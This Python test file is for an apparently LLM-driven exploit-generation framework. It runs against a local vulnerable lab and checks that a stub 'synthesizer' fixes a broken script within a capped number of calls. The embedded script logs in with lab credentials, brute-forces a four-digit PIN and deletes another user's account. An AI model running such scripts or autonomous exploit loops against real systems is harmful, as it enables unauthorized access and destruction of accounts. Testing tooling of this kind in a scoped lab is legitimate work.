"""
Proof for the LLM-frugal one-shot hunt: deterministic recon -> a hard-capped few
synth calls -> self-verified exploit script. Uses a stub synthesizer (no LLM) that
first returns a BROKEN script, then a fixed one — proving the bounded feedback
loop and that total 'LLM' calls stay tiny (here: 2), which is the whole point.
"""

import asyncio

from venom.core.scope import Scope
from venom.core.registry import EndpointRegistry, Endpoint
from venom.cognition import oneshot_hunt, Objective
from vulnlab.app import make_transport, new_state, PIN

BASE = "https://vuln.local"


def _scope():
    return Scope.from_dict({"engagement_id": "E", "target_name": "VulnLab",
                            "authorized_base_urls": [BASE], "rate_limit_per_second": 100000,
                            "allow_destructive": True,
                            "authorization_date": "2026-01-01T00:00:00Z",
                            "expiry_date": "2030-01-01T00:00:00Z"})


def _reg():
    reg = EndpointRegistry()
    for p, m in [("/login", "POST"), ("/pin", "GET"), ("/pin/verify", "POST"), ("/pin/delete", "POST")]:
        reg.add(Endpoint(path=p, method=m, source=["crawl"]))
    return reg


BROKEN = "async def exploit(http):\n    import requests\n    return 'x'\n"   # blocked import -> error
FIXED = (
    "async def exploit(http):\n"
    "    await http('POST', '/login', data={'username': 'wiener', 'password': 'peter'})\n"
    "    for i in range(10000):\n"
    "        if 'verified' in (await http('POST', '/pin/verify', data={'pin': str(i).zfill(4)}))['text']:\n"
    "            break\n"
    "    await http('POST', '/pin/delete', data={'username': 'carlos'})\n"
    "    return 'done'\n"
)


def test_oneshot_recovers_within_call_budget_and_solves():
    transport, state = make_transport(new_state())
    calls = {"n": 0}

    async def stub_synth(brief, last_result):
        calls["n"] += 1
        # brief must be compact recon (no LLM here)
        assert "endpoints" in brief and brief["objective"]
        if calls["n"] == 1:
            assert last_result is None
            return {"vuln_class": "FAITH_BASED_RULE", "rationale": "brute pin", "exploit_code": BROKEN}
        # got sharp feedback from the failed run (win-oracle signal), now fix
        assert last_result and last_result.get("objective_met") is False and last_result.get("hint")
        return {"vuln_class": "FAITH_BASED_RULE", "rationale": "brute pin", "exploit_code": FIXED}

    # General oracle: the win is that a forbidden action (delete carlos) now succeeds —
    # NO lab string. Baseline (anon) is 403; after the exploit it returns "deleted".
    obj = Objective(description="delete the user carlos",
                    win_action={"method": "POST", "path": "/pin/delete", "data": {"username": "carlos"}},
                    success_text="deleted")
    findings = asyncio.run(oneshot_hunt(_scope(), _reg(), stub_synth, objective=obj,
                                        transport=transport, max_llm_calls=3))
    assert findings and findings[0].test_id == "ONE-001"
    assert state["solved"]["pin"] is True
    assert calls["n"] == 2, f"used {calls['n']} calls (should be 2: broken then fixed)"
    assert findings[0].evidence["exploit_code"]              # the self-authored script is recorded


def test_oneshot_respects_hard_call_cap():
    transport, _ = make_transport(new_state())
    calls = {"n": 0}

    async def always_broken(brief, last_result):
        calls["n"] += 1
        return {"vuln_class": "X", "rationale": "nope", "exploit_code": BROKEN}

    obj = Objective(description="delete the user carlos",
                    win_action={"method": "POST", "path": "/pin/delete", "data": {"username": "carlos"}},
                    success_text="deleted")
    findings = asyncio.run(oneshot_hunt(_scope(), _reg(), always_broken, objective=obj,
                                        transport=transport, max_llm_calls=2))
    assert findings == []
    assert calls["n"] == 2, "call cap not enforced"
